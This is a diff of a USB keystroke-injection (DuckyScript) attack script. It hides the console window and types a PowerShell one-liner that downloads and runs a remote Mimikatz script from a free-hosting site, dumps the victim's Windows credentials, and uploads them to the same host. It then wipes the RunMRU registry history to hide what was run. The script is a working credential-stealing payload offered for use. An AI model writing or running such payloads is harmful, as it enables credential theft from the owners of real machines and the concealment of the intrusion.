@@ -10,7 +10,8 @@ ALT y
 DELAY 750
 STRING mode con:cols=18 lines=1; color FE
 ENTER
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://pwningstuff.000webhostapp.com/executables/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://pwningstuff.000webhostapp.com/upload/creds/rxc.php', $output)"
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://pwningstuff.000webhostapp.com/executables/im.ps1')
+STRING ; $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://pwningstuff.000webhostapp.com/upload/creds/rxc.php', $output)"
 ENTER
 DELAY 15000
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
